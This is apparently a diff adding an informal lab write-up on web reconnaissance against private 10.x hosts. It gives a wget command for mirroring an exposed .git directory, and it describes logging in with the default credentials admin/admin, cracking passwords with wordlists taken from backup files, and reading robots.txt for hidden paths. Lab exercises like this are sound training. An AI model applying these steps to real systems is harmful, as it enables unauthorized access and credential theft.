@@ -1,0 +1,34 @@
+For git research, used- wget, cat, cd and .git
+For blind guessing, I have used 10.1.0.12 's wesite. I have just used admin as username and admin as password and I got the access.
+
+Command used: wget --mirror -I .git http://10.1.0.7/.git
+git status | head -n 15
+cd 10.1.0.7
+cd .git
+git init
+cat 'index.html'
+cat 'index.html?C=D;O=A'
+cat 'index.html?C=D;O=D'
+cat 'index.html?C=M;O=A'
+cat 'index.html?C=M;O=D'
+cat 'index.html?C=N;O=A'
+cat 'index.html?C=N;O=D'
+cat 'index.html?C=S;O=A'
+cat 'index.html?C=S;O=D'
+
+From the sensetive data file and old backup and unreferenced file, it was easy to crack the password using wordlists.
+
+Additionally I found a source of clues about unreferenced directories, using 10.1.0.11/robots.txt command. Shown in output images.
+
+
+
+
+
+
+
+
+
+
+
+
+.
